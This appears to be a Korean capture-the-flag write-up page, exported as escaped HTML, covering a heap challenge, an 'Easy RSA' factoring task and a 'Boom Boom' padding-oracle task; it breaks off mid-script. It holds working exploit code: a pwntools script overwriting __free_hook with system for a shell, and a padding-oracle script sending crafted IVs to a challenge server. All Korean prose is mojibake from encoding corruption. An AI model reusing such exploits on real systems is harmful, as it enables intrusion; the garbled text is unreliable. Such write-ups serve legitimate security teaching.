ì„¤ê³„í–ˆë‹¤. ê·¸ë˜ì„œ ì´ ë¬¸ì œë¥¼ í‘¸ëŠ” ëª¨ë“  ë¶„ë“¤ì´ ëª¨ë¥´ë©´ ëª»í‘¸ëŠ” íŠ¸ë¦­ë¬¸ì œë¼ê³  ìƒê°í•˜ì§€ ì•Šì•˜ìœ¼ë©´ ì¢‹ê² ë‹¤ëŠ” ë§ˆìŒìœ¼ë¡œ ìµœëŒ€í•œ ìµìŠ¤ ìœ ë„ë¥¼ í•´ë´¤ë‹¤.&lt;/p&gt;&lt;p id=&quot;ce34f6c4-508d-4183-86bd-4e6a213f7ab0&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;665ae0e6-c8f1-4b45-9720-5e91165a4565&quot; class=&quot;&quot;&gt;Exploit Code&lt;/h3&gt;&lt;p id=&quot;f530bb7c-3cae-450e-9bad-bec43cb90e69&quot; class=&quot;&quot;&gt;ì‹¤ìˆ˜ë¡œ ë¬¸ì œ ì½”ë“œì™€ exploitì„ ë‹¤ ë‚ ë ¤ë²„ë¦° ë°”ëŒì—,, ë¬¸ì œë¥¼ í¬ë¡œìŠ¤ ì²´í‚¹ í•´ì£¼ì‹  í•µì‹¬ì—°êµ¬íŒ€ ê¹€ë™ë¯¼ë‹˜(@gpsfly) ìµìŠ¤ë¥¼ ì²¨ë¶€í•œë‹¤.&lt;/p&gt;&lt;pre id=&quot;234fb01c-1d4d-458b-8cb1-4c1de51cb73f&quot; class=&quot;code&quot;&gt;&lt;code&gt;from pwn import *
import sys

bi = &amp;#x27;./bin.elf&amp;#x27;
#r = process([bi])
r = remote(&amp;#x27;bob.lordofpwn.kr&amp;#x27;, 31337)
context.terminal = [&amp;#x27;tmux&amp;#x27;, &amp;#x27;new-window&amp;#x27;]
sla = r.sendlineafter
sa = r.sendafter
p = pause
dbg = gdb.attach
e = ELF(bi)
l = ELF(&amp;#x27;libc&amp;#x27;) # remote
#l = ELF(&amp;#x27;libc.so.6&amp;#x27;) # local

sc = &amp;#x27;&amp;#x27;&amp;#x27;
heap-analysis-helper
c
&amp;#x27;&amp;#x27;&amp;#x27;
if len(sys.argv) &amp;gt; 1:
    dbg(r, sc)

xla = lambda x : sla(&amp;#x27;&amp;gt;&amp;gt; &amp;#x27;, str(x))
xa = lambda x : sa(&amp;#x27;&amp;gt;&amp;gt; &amp;#x27;, str(x))
create = lambda name : [xla(1), xa(name)]
edit = lambda idx,name : [xla(2), xla(idx), xa(name)]
add = lambda idx,name,age,height : [xla(3), xla(idx), xa(name), xla(age), xla(height)]
check = lambda idx : [xla(4), xla(idx)]
hidden = lambda hidx,pidx,name : [xla(31337), xla(hidx), xla(pidx), xa(name)]

for i in range(7):
    create(&amp;#x27;/bin/sh&amp;#x27;)
    for j in range(8):
        add(i, &amp;#x27;{}_{};/bin/sh&amp;#x27;.format(i,j), 1, 1)

cnt = 0
while True:
    data = r.recvline().strip()
    if &amp;#x27;The gift&amp;#x27; in data:
        libc = int(data.split(&amp;#x27; : &amp;#x27;)[1], 16) - l.sym[&amp;#x27;printf&amp;#x27;]
        log.info(&amp;quot;libc @ {}&amp;quot;.format(hex(libc)))
    elif &amp;#x27;infected&amp;#x27; in data:
        cnt += 1
        print(cnt, data)
        if cnt == 8:
            i, j = data.split(&amp;#x27; was &amp;#x27;)[0].split(&amp;#x27;;&amp;#x27;)[0].split(&amp;#x27;_&amp;#x27;)
            r.sendline(&amp;#x27;5&amp;#x27;)
            hidden(i, j, p64(libc+l.sym[&amp;#x27;__free_hook&amp;#x27;]-0x10)) #free_hook-0x10
            create(&amp;#x27;A&amp;#x27;*0x60)
            add(i, p64(libc+l.sym[&amp;#x27;system&amp;#x27;]), 1, 1) #system
            edit(0, &amp;#x27;X&amp;#x27;)
            break

r.interactive()&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;f8b0e00a-3c78-4c60-983e-a404d3ffe4ab&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h1 id=&quot;f29fa220-8c9a-49a5-8b93-7ba1ea220b93&quot; class=&quot;&quot;&gt;ğŸ–¥ï¸ CRYPTO&lt;/h1&gt;&lt;h2 id=&quot;e30d6697-49a2-40cc-956b-dbd6fea02623&quot; class=&quot;&quot;&gt;Easy RSA&lt;/h2&gt;&lt;hr id=&quot;b3673360-d14c-4664-b4bf-b7f1203bb941&quot;/&gt;&lt;figure id=&quot;c1cd37e1-76f2-4b79-b060-97148efccf9f&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob977.png&quot;&gt;&lt;img style=&quot;width:710px&quot; src=&quot;/assets/bob/bob977.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;030f4d65-e819-4a46-8562-deaeff9473b1&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;Easy polynomial factoring&lt;/div&gt;&lt;/figure&gt;&lt;ul id=&quot;1bf674ac-7a7b-47e9-88a1-6bf87e8290f4&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë¬¸ì œì—ì„œëŠ” ê³µê°œí‚¤ë§Œ ì œê³µëœë‹¤. ì¦‰ ì´ ë¬¸ì œì—ì„œëŠ” Nì„ factorizationí•˜ëŠ” ê²Œ ëª©í‘œì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;3375a10c-ac4f-4e6b-8f40-f73a2c49b8a7&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;codeì—ì„œ Nì˜ ê°’ì„ 13ì§„ë²•ìœ¼ë¡œ ì‚´í´ë³´ë¼ëŠ” íŒíŠ¸ê°€ ì£¼ì–´ì¡Œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;e6d16a96-0b97-4a12-912c-23b81255c8c0&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Nì„ base 13ìœ¼ë¡œ ì‚´í´ë³´ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;21ca0fea-1022-48c6-b82c-37390d6a0737&quot; class=&quot;&quot;&gt;&lt;code&gt;1100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013a41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019bba2&lt;/code&gt;&lt;/p&gt;&lt;ul id=&quot;749d4e73-4c28-4b2d-9253-494bc6c910ea&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ë¥¼ ë‹¤í•­ì‹ìœ¼ë¡œ ë‚˜íƒ€ë‚´ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;33e9d772-8a62-4cea-adeb-e9e4ea042bed&quot; class=&quot;&quot;&gt;&lt;code&gt;x^400 + x^399 + x^203 + 3&lt;/code&gt;&lt;code&gt;&lt;em&gt;x^202 + 10&lt;/em&gt;&lt;/code&gt;&lt;code&gt;x^201 + 4&lt;/code&gt;&lt;code&gt;&lt;em&gt;x^200 + x^199 + x^5 + 9&lt;/em&gt;&lt;/code&gt;&lt;code&gt;x^4 + 11&lt;/code&gt;&lt;code&gt;&lt;em&gt;x^3 + 11&lt;/em&gt;&lt;/code&gt;&lt;code&gt;x^2 + 10*x + 2 (x=13)&lt;/code&gt;&lt;/p&gt;&lt;ul id=&quot;e140ff76-11a9-4877-85bd-6f82c83613af&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;sageì—ì„œ í•´ë‹¹ ë‹¤í•­ì‹ì„ &lt;code&gt;poly.factor()&lt;/code&gt;ë¡œ factorizationí•˜ë©´ pì™€ që¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;5c7f72c2-e3ac-4a51-88cb-d594d3afe7ba&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;8212a2f0-327d-4a7e-870c-63dd95c8e347&quot; class=&quot;&quot;&gt;&lt;strong&gt;Exploit Code&lt;/strong&gt;&lt;/p&gt;&lt;pre id=&quot;cd451fd8-14d7-4d86-b80b-c3b31b9e1de1&quot; class=&quot;code&quot;&gt;&lt;code&gt;sage: N = 4069355261174518447044221465092549731956949577068389562886621536859114995157407396913103746675307806861475505196604075690189887011157213
....: 06579441204391802579988679325559464933524679569288946633797366876605906618330862289486089133036525973648043594211930902803789362401571187621
....: 75215559436614871795165204002781471609204034064252028413035000407848466271441883438192490960762478416146403426890827177153457241880068131862
....: 173969477923674349247844851493
sage: 
sage: N.str(base=13)
&amp;#x27;1100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013a41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019bba2&amp;#x27;
sage: poly = sum(e * x^i for i,e in enumerate(N.digits(13)))
sage: 
sage: poly
x^400 + x^399 + x^203 + 3*x^202 + 10*x^201 + 4*x^200 + x^199 + x^5 + 9*x^4 + 11*x^3 + 11*x^2 + 10*x + 2
sage: poly.factor()
  ***   Warning: increasing stack size to 2000000.
(x^200 + x^199 + x^2 + 8*x + 2)*(x^200 + x^3 + x^2 + x + 1)
sage: p = 13^200 + 13^199 + 13^2 + 8*13 + 2
sage: q = 13^200 + 13^3 + 13^2 + 13 + 1&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;5fcac5aa-b6c9-40bb-ba44-b93aa3fe652e&quot; class=&quot;&quot;&gt;Boom Boom&lt;/h2&gt;&lt;hr id=&quot;fdf45155-38d9-4ac0-b572-ff3f92e6c98c&quot;/&gt;&lt;figure id=&quot;5d7fb1f2-08fd-48e6-811c-34941edb0fe1&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob978.png&quot;&gt;&lt;img style=&quot;width:716px&quot; src=&quot;/assets/bob/bob978.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;cb3ccbd3-c6cc-4fa2-b566-160cf29012d2&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;Oracle Padding Attack&lt;/div&gt;&lt;/figure&gt;&lt;figure id=&quot;74b11c57-88f8-46b8-b45c-884363444fc0&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob979.png&quot;&gt;&lt;img style=&quot;width:952px&quot; src=&quot;/assets/bob/bob979.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;f9199a05-7816-4dc0-9b58-691d40ba4773&quot; class=&quot;&quot;&gt;&lt;mark class=&quot;highlight-red_background&quot;&gt;&lt;strong&gt;ë¬¸ì œí™•ì¸&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;&lt;blockquote id=&quot;e7c13afa-8a3f-4258-80b3-87fca747d3ec&quot; class=&quot;&quot;&gt;í…ŒëŸ¬ë‹¨ì²´ì—ì„œ í­íƒ„í…ŒëŸ¬ê°€ ìˆì„ ì˜ˆì •ì´ë¼ëŠ” ì²©ë³´ë¥¼ ì…ìˆ˜í–ˆë‹¤....(ìƒëµ)... ì•”í˜¸ë¬¸ì„ ë³µí˜¸í™”í•˜ê³  ì•”í˜¸ í•´ì œ ë¹„ë°€ë²ˆí˜¸ë¥¼ íšë“í•´ë¼!&lt;/blockquote&gt;&lt;ul id=&quot;33af78f1-6a08-4b7f-a57f-7c8c14a85172&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë¬¸ì œì— ì ‘ì†í•˜ë©´ ë©”ì‹œì§€ì™€ í•¨ê»˜ IVì™€ Ciphertextë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;d311e82f-5db2-4cce-8724-2d2cab5654c2&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í˜ì´ì§€ì— ìƒˆë¡œ ì ‘ì†í•  ë•Œë§ˆë‹¤ ìƒˆë¡œìš´ IVì™€ Ciphertextë¥¼ ì¶œë ¥í•´ì¤€ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;fd320cb7-d7d9-4576-b8cc-6add37523e57&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;8686d6e1-012b-414c-8e9f-951db22c1135&quot; class=&quot;&quot;&gt;&lt;mark class=&quot;highlight-red_background&quot;&gt;&lt;strong&gt;ê¸°ëŠ¥í™•ì¸&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;&lt;figure id=&quot;747a631c-1a67-4fbd-99ee-ec83b6a3246a&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob980.png&quot;&gt;&lt;img style=&quot;width:952px&quot; src=&quot;/assets/bob/bob980.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;71a7122f-0081-4a54-9ace-16ad8ea98727&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;Module&lt;/code&gt; í˜ì´ì§€ì—ì„œëŠ” &lt;code&gt;IV&lt;/code&gt;ì™€ &lt;code&gt;Ciphertext&lt;/code&gt;ë¥¼ ì…ë ¥í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;6caf420a-62bb-4b51-8e2e-02be7e795a90&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;59c28394-d180-45c3-a233-776fa2c785ab&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob981.png&quot;&gt;&lt;img style=&quot;width:952px&quot; src=&quot;/assets/bob/bob981.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;160dec38-363b-4615-8ebb-66d6291389dc&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;Flag&lt;/code&gt; í˜ì´ì§€ì—ì„œëŠ” &lt;code&gt;Passcode&lt;/code&gt;ë¥¼ ì…ë ¥í•  ìˆ˜ ìˆë‹¤. ì˜¬ë°”ë¥¸ &lt;code&gt;Passcode&lt;/code&gt;ë¥¼ ì…ë ¥í•˜ë©´ &lt;code&gt;FlAG&lt;/code&gt;ë¥¼ ì¶œë ¥í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;592a60bb-c3d9-4207-af9c-2a7f3ccee51f&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;e09f24d2-ab52-47d5-aa3a-60b931276d4f&quot; class=&quot;&quot;&gt;&lt;mark class=&quot;highlight-red_background&quot;&gt;&lt;strong&gt;ë¶„ì„&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;&lt;ul id=&quot;3f74d406-de1b-4c63-9e87-7e2b6dd1ae94&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Module í˜ì´ì§€ì—ì„œëŠ” ì´ 3ê°€ì§€ì˜ ì‘ë‹µì´ ì¡´ì¬í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;3c0a2c42-f2c5-441d-99ee-861848cbb43c&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob982.png&quot;&gt;&lt;img style=&quot;width:952px&quot; src=&quot;/assets/bob/bob982.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;911eef9d-c329-45e0-b05d-fa4076d3afb5&quot; class=&quot;&quot;&gt;&lt;strong&gt;1) Invalid padding&lt;/strong&gt;&lt;div class=&quot;indented&quot;&gt;&lt;ul id=&quot;8b067b7f-a3a9-48fe-b2d8-54a525124aee&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;IVê°€ ì•Œë§ì§€ ì•Šì„ ê²½ìš° ë°œìƒ(Padding error)&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/p&gt;&lt;p id=&quot;6f1b9238-bdf0-4983-a7b4-b051f7e3dabf&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;e978b750-f7a4-4d07-bc4f-5426b12d21ef&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob983.png&quot;&gt;&lt;img style=&quot;width:952px&quot; src=&quot;/assets/bob/bob983.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure id=&quot;3f80f806-f6d8-43a6-812d-b4b9d499ad9f&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob984.png&quot;&gt;&lt;img style=&quot;width:1366px&quot; src=&quot;/assets/bob/bob984.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;7e01af8b-efce-475e-938d-9e78a0f91327&quot; class=&quot;&quot;&gt;&lt;strong&gt;2) incoreect!&lt;/strong&gt;&lt;div class=&quot;indented&quot;&gt;&lt;ul id=&quot;94e9f9af-a045-4bc4-b6c5-26512764d212&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Paddingì€ ì•Œë§ê²Œ ì±„ì›Œì§„ ê²½ìš°&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/p&gt;&lt;p id=&quot;d49c5462-d434-42c8-82ec-2a7b5ec9a808&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;cfe2cdf0-5ba7-471a-814b-89efcc7d6ec6&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob985.png&quot;&gt;&lt;img style=&quot;width:952px&quot; src=&quot;/assets/bob/bob985.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;e37948c5-dfb4-4b9f-a108-da5d1041d3e3&quot; class=&quot;&quot;&gt;&lt;strong&gt;3) correct!&lt;/strong&gt;&lt;div class=&quot;indented&quot;&gt;&lt;ul id=&quot;be04c109-c2ae-4bd6-931c-002320be84d3&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;IVì™€ Ciphertext ëª¨ë‘ ì•Œë§ì„ ê²½ìš° ë°œìƒ&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/p&gt;&lt;p id=&quot;82ec1356-7511-42ee-a004-c43bd3d1d7d8&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;7e29cf79-7ee0-4483-a40c-e2bbe3e25e74&quot; class=&quot;&quot;&gt;&lt;strong&gt;&lt;mark class=&quot;highlight-red_background&quot;&gt;Oracle Padding Attack ê°œë…&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;&lt;ul id=&quot;dce3123a-c43d-4e4d-a067-ff054220f056&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì·¨ì•½ì  ì„¤ëª…&lt;ul id=&quot;22a2d892-9893-4280-83c4-38721f3487cb&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë¸”ë¡ì•”í˜¸ì—ì„œ ì‚¬ìš©ë˜ëŠ” íŒ¨ë”©ì´, ì˜¬ë°”ë¥¸ì§€ ì˜¬ë°”ë¥´ì§€ ì•Šì€ì§€ì— ë”°ë¼ ì„œë²„ì˜ ì‘ë‹µì´ ë‹¬ë¼ì§ˆ ê²½ìš° ì´ë¥¼ í†µí•´ ê³µê²©ì„ ìˆ˜í–‰ í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;4236a5f7-0792-4ecc-a050-82723d44f8ed&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;12ec4409-a26b-4a4c-b9a7-a349ce2037c6&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;íŒ¨ë”©ì´ë€?&lt;ul id=&quot;4ddb66da-f878-45ed-b435-f7a2e935b41d&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë¸”ë¡ ì•”í˜¸í™”í•´ì„œ ì‚¬ìš©í•˜ëŠ” ê²ƒìœ¼ë¡œ, ì¼ì • ë‹¨ìœ„ë¡œ ë¸”ë¡ì„ ìë¥¼ë•Œ ë§ˆì§€ë§‰ ë¸”ë¡ì— ì• ë¸”ë¡ê³¼ ê°™ì€ ê¸¸ì´ë¡œ ë§Œë“¤ì–´ì£¼ê¸° ìœ„í•´ ë‚¨ëŠ” ê³³ì€ íŒ¨ë”©ìœ¼ë¡œ ì±„ìš´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;cd1f4d05-dacc-43ff-869b-3bac57acf342&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob986.png&quot;&gt;&lt;img style=&quot;width:1156px&quot; src=&quot;/assets/bob/bob986.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;a1a63b26-3f6e-4969-9be0-af65f19689b8&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì˜¤ë¼í´ íŒ¨ë”©ì˜ ê²½ìš°, 5byteê°€ ë‚¨ì•˜ìœ¼ë©´ 0x05ë¡œ 5byteë¥¼ ì±„ìš°ê³  2byteê°€ ë‚¨ì•˜ìœ¼ë©´ 0x02ë¡œ 2byteë¥¼ ì±„ìš´ë‹¤. &lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;1b73d82d-0929-4bf8-b4b9-22c9d623860b&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë§Œì•½ í‰ë¬¸ì´ 8byteì¼ ê²½ìš° ë‹¤ìŒ ë¸”ë¡ì„ ëª¨ë‘ 0x08ë¡œ 8byte ì±„ìš´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;25cebc16-3c57-43d4-b35b-6044a6e91515&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;ee3b0eb2-7031-4094-94aa-16c3a4132deb&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob987.png&quot;&gt;&lt;img style=&quot;width:1155px&quot; src=&quot;/assets/bob/bob987.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;e948d935-0652-45aa-af5d-a16c573cb355&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì•”í˜¸í™”ë¥¼ ìˆ˜í–‰í•˜ëŠ” ê³¼ì •ì€ ìœ„ ê·¸ë¦¼ê³¼ ê°™ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;11afe662-ad40-4a2d-be0c-0cfd9232820a&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ivì™€ plain textë¥¼ xor í•˜ì—¬ Intermediary Valueë¥¼ ì–»ê³  ê·¸ ê°’ì„ 3DES ì•”í˜¸í™” ë°©ì‹ì„ ê±°ì³ ì•”í˜¸ë¬¸ìœ¼ë¡œ ë‚˜ì˜¨ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;13dad8fd-cd9f-45da-8a34-1dc336111f14&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´í›„ ê·¸ ì•”í˜¸ë¬¸ì„ ivë¡œ ì‚¬ìš©í•œë‹¤. &lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;d946a037-22db-4863-992c-33c6bb6141a4&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì¦‰ ì•”í˜¸ë¬¸ì€, IV+ì•”í˜¸ë¸”ëŸ­1+ì•”í˜¸ë¸”ëŸ­2ë¡œ ì´ë¤„ì§„ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;83583dfa-a5a0-4b0e-8f85-eae67a36126a&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob988.png&quot;&gt;&lt;img style=&quot;width:995px&quot; src=&quot;/assets/bob/bob988.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;ded9bc88-25e8-4137-8d16-34898f9ad9f9&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë³µí˜¸í™” ê³¼ì •ì„ ì‚´í´ë³´ë©´ ìœ„ ê·¸ë¦¼ê³¼ ê°™ë‹¤. ì•”í˜¸ë¬¸ì„ 3DESë¡œ ë³µí˜¸í™” í•˜ì—¬ Intermediary Value ê°’ì„ ì–»ëŠ”ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;850128cf-e060-4e80-979e-f141a45983ce&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´í›„ IVì™€ Intermediary Valueë¥¼ XOR í•˜ì—¬ plain ê°’ì„ ì–»ëŠ”ë‹¤. &lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;cf07b386-aec3-4e39-adee-078bfc46f0a1&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob989.png&quot;&gt;&lt;img style=&quot;width:899px&quot; src=&quot;/assets/bob/bob989.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;18f2cb11-879a-48e7-913e-02d8f7d47d64&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;IVì™€ Intermediary Value ê°’ì„ XOR í•œ plain ë¸”ëŸ­ì˜ ë§ˆì§€ë§‰ ê°’(íŒ¨ë”© ë¶€ë¶„)ì´ 0x01ì´ ë˜ëŠ” IV ë§ˆì§€ë§‰ ê°’ ì°¾ê³ , 0x01ê³¼ ê·¸ IV ë§ˆì§€ë§‰ ê°’ì„ XOR í•˜ë©´ Intermediaryì˜ ë§ˆì§€ë§‰ ê°’ì„ ì•Œ ìˆ˜ ìˆë‹¤. &lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;fc357646-dedc-432b-ae68-1a47caa549f5&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë™ì¼í•œ ë°©ì‹ìœ¼ë¡œ 0x01 ë¶€í„° 0x08ê¹Œì§€ íŒ¨ë”©ì„ ê°€ì •í•˜ì—¬ IV ê°’ì„ ë³€ê²½í•˜ë©° ì„œë²„ë¡œ ìš”ì²­ì„ ìˆ˜í–‰í•˜ê³ , invalid ì‘ë‹µì„ ê²½ìš°ì˜ ê°’ì„ ivë¡œ ë‘ê³  ê·¸ë•Œì˜ íŒ¨ë”© ê°’ê³¼ xor í•˜ì—¬ intermediary value ê°’ì„ ì–»ì„ ìˆ˜ ìˆê³  intermediary value ê°’ê³¼ ì´ë¯¸ ì•Œê³ ìˆëŠ” iv ê°’ì„ xor í•˜ì—¬ plain ê°’ì„ ì–»ì„ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;535b881f-745d-4614-9b11-2a53a66fea3f&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;2a7f6568-897f-496a-9289-b5ec978e0d24&quot; class=&quot;&quot;&gt;&lt;strong&gt;&lt;mark class=&quot;highlight-red_background&quot;&gt;FlAG íšë“!&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p id=&quot;a5d3e5ca-aaee-43f9-b1e4-ad964a95a8d1&quot; class=&quot;&quot;&gt;Exploit code&lt;/p&gt;&lt;pre id=&quot;0bb3e509-45fc-4816-b993-bc9d57a7bb57&quot; class=&quot;code&quot;&gt;&lt;code&gt;import base64
from urllib.parse import quote, unquote
import binascii
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from collections import OrderedDict
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# paload send
def send_payload(s, payload_iv, payload_ciphertext):
    # variable initialization
	url = &amp;quot;&amp;quot;
	headers = {}
	params = {}
	data = {}

    # URL setting
	url = &amp;#x27;http://1-star.kr/onestar/padding/module.php&amp;#x27;

    # params setting
	params = {&amp;#x27;iv&amp;#x27;: base64.b64encode(payload_iv), &amp;#x27;ciphertext&amp;#x27;: base64.b64encode(payload_ciphertext)}

    # data setting
	data = OrderedDict()

    # send packet
	r = s.get(url, params=params, verify=False)
	return r.text

def xor(data, key):
	output = bytearray()
	for i, ch in enumerate(data):
		output.append(ch ^ key[i % len(key)])
	return bytes(output)

# hex
def hex_view(data):
	temp = data.hex()
	ret = &amp;quot;&amp;quot;
	for i in range(0, len(temp), 2):
		ret += temp[i:i+2] + &amp;quot; &amp;quot;
	return ret

iv=base64.b64decode(unquote(&amp;quot;QjA2bGwxVTM%3D&amp;quot;))
enc=base64.b64decode(unquote(&amp;quot;EJA3gltQjV4%3D&amp;quot;))
inter=b&amp;#x27;&amp;#x27;
s = requests.Session()

print(&amp;quot;I V =&amp;gt; {}&amp;quot;.format(hex_view(iv)))
print(&amp;quot;ENC =&amp;gt; {}&amp;quot;.format(hex_view(enc)))

#make iv 1~len(iv)+1 
for i in range(1,len(iv)+1):
	print (&amp;quot;===========================================&amp;quot;)
	print (&amp;quot;i: &amp;quot;,i)
	start = iv[:len(iv)-i]
	print (&amp;quot;start: &amp;quot;, hex_view(start))
